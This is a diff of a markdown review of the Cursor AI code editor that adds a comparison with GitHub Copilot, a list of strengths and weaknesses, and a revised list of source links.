-1. **Not open source**: No ability to self-host or audit the model
-2. **No MCP support**: Cannot extend with external tool servers
-3. **macOS sandbox only**: Windows/Linux don't have sandboxed terminals yet
-4. **Vendor lock-in**: Composer model only available in Cursor
+### Key differences in practice
+
+1. **Context quality**: Cursor's codebase indexing is generally considered deeper and more accurate for large projects
+2. **Model flexibility**: Cursor lets you pick any frontier model; Copilot has a curated list
+3. **GitHub integration**: Copilot wins here — it's deeply tied into GitHub issues, PRs, and Actions
+4. **Cost**: Copilot is cheaper for basic use; Cursor is comparable for heavy users
+5. **Privacy**: Both offer enterprise privacy controls; Cursor's Privacy Mode is more granular
+6. **Agent autonomy**: Both are converging, but Cursor was earlier and more aggressive here
+
+---
+
+## Strengths & Weaknesses
+
+### ✅ Strengths
+
+1. **Best-in-class IDE experience**: Polished, fast, familiar (VS Code fork)
+2. **Deep codebase understanding**: Vector embedding-based index for semantic search
+3. **Model flexibility**: Switch between frontier models per task
+4. **Agent mode with terminal access**: Full autonomy for complex tasks
+5. **Background agents**: Long-running tasks without blocking your machine
+6. **MCP ecosystem**: Extensible with any MCP server
+7. **Next-edit prediction**: Tab completion predicts the *next* change, not just the current one
+8. **Strong enterprise adoption**: Fortune 500, NVIDIA-scale deployments
+9. **Active development**: Ships updates weekly
+
+### ❌ Weaknesses
+
+1. **Proprietary**: Closed source; you're dependent on Anysphere
+2. **Credit system opacity**: Hard to predict costs; billing surprises reported
+3. **Privacy concerns**: Code leaves your machine (except Privacy Mode)
+4. **Indexing cost**: Index is on Anysphere's servers by default; requires trust
+5. **Not GitHub-native**: Less integrated with GitHub ecosystem vs Copilot
+6. **Heavy resource usage**: VS Code fork with background indexing uses significant RAM/CPU
+7. **Context limits**: Even with indexing, very large monorepos can overwhelm context
 
 ---
 
 ## Sources
 
-1. [Cursor Official Website](https://cursor.com/)
-2. [Cursor 2.0 Changelog](https://cursor.com/changelog/2-0)
-3. [Cursor 2.0 & Composer Analysis](https://www.cometapi.com/cursor-2-0-what-changed-and-why-it-matters/)
-4. [Cursor Features Page](https://cursor.com/features)
-5. [Cursor 2.0 Ultimate Guide 2025](https://skywork.ai/blog/vibecoding/cursor-2-0-ultimate-guide-2025-ai-code-editing/)
-6. Cursor official changelog and blog posts (October 2025)
-
----
-
-*Last updated: March 2026*
+- Cursor official site: https://cursor.com
+- Cursor features page: https://cursor.com/features
+- Cursor product page: https://cursor.com/product
+- Cursor background agents docs: https://docs.cursor.com/en/background-agent
+- VS Code Copilot agent mode launch post: https://code.visualstudio.com/blogs/2025/02/24/introducing-copilot-agent-mode
+- Cursor AI Review 2025 (Skywork): https://skywork.ai/blog/cursor-ai-review-2025-agent-refactors-privacy/
+- Cursor 2.0 and Composer analysis (CometAPI): https://www.cometapi.com/cursor-2-0-what-changed-and-why-it-matters/
+- Cursor 2.0 explained (Codecademy): https://www.codecademy.com/article/cursor-2-0-new-ai-model-explained
+- AI coding agents comparison: https://artificialanalysis.ai/insights/coding-agents-comparison
+- Morph LLM 15 agents tested: https://www.morphllm.com/ai-coding-agent
